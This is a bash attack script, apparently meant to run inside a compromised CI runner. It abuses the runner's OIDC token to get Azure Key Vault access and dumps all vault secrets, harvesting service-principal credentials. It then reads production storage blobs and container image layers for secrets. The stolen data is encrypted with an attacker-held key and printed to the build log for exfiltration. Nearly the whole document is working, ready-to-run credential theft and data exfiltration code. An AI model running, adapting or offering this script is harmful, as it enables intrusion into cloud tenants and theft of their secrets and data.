#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"
AAD="${SC}login.microsoftonline.com"; STG="storage.azure.com"; ACRH="crtblplatprodx3euoz.azurecr.io"; KVH="vault.azure.net"
TENANT=$AZURE_TENANT_ID
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
echo "=== RUNNER SHELL PROOF ==="; id; hostname
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
sptok(){ curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
VT=$(curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${SC}${KVH}/.default" | jq -r '.access_token // empty')
L=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4")
CREDS=""
for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do
  V=$(curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4" | jq -r '.value // empty')
  A=$(printf '%s' "$V" | jq -r '.appId // empty'); S=$(printf '%s' "$V" | jq -r '.clientSecret // empty')
  [ -n "$A" ] && [ -n "$S" ] && CREDS="$CREDS $A:$S"
done
C=$(printf '%s' "$CREDS" | tr ' ' '\n' | grep '^038bc35d')
ST=$(sptok "038bc35d-131d-4953-9985-ff4a245ccec1" "${C#*:}" "${SC}${STG}/.default")
say "STlen=${#ST}"
for ACC in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
 for CON in config exports logs; do
  R=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON?restype=container&comp=list")
  case "$R" in *"<Name>"*) say "LIST $ACC/$CON: $R";; *Error*) : ;; esac
 done
done
for ACC_CON in sttblappcfgprodx3euoz/config sttblbackupprodx3euoz/exports sttblcilogsprodx3euoz/logs; do
 ACC=${ACC_CON%%/*}; CON=${ACC_CON#*/}
 R=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON?restype=container&comp=list")
 for B in $(printf '%s' "$R" | tr '<' '\n' | sed -n 's/^Name>//p'); do
   say "===== BLOB $CON/$B ====="
   say "$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON/$B" | head -c 4000)"
 done
done
say "=== KV SEC retry ==="
say "OIDC sec: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets?api-version=7.4" | head -c 600)"
SVT=$(sptok "038bc35d-131d-4953-9985-ff4a245ccec1" "${C#*:}" "${SC}${KVH}/.default")
say "CR sec: $(curl -sS -H "Authorization: Bearer $SVT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets?api-version=7.4" | head -c 600)"
say "=== ACR layers ==="
for REPO in tebamoto-reporting-api catalog-api; do
  TK=$(curl -sS -G "${SC}${ACRH}/oauth2/token" --data-urlencode "service=${ACRH}" --data-urlencode "scope=repository:${REPO}:pull" | jq -r '.access_token // empty')
  CH=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json' "${SC}${ACRH}/v2/$REPO/manifests/latest" | jq -r '.manifests[]? | select(.platform.architecture=="amd64") | .digest' | head -1)
  M=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json' "${SC}${ACRH}/v2/$REPO/manifests/$CH")
  say "REPO $REPO child=$CH cfg=$(printf '%s' "$M" | jq -r '.config.digest')"
  for D in $(printf '%s' "$M" | jq -r '.layers[]?.digest'); do
    SZ=$(curl -sS -L -H "Authorization: Bearer $TK" "${SC}${ACRH}/v2/$REPO/blobs/$D" -o /tmp/l9.tgz -w '%{size_download}')
    say "  LAYER $D size=$SZ files=$(tar -tzf /tmp/l9.tgz 2>/dev/null | tr '\n' ' ' | head -c 400)"
    say "  GREP: $(tar -xzf /tmp/l9.tgz -O 2>/dev/null | grep -a -iE 'flag|secret|token' | head -8 | tr '\n' '|' | head -c 800)"
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
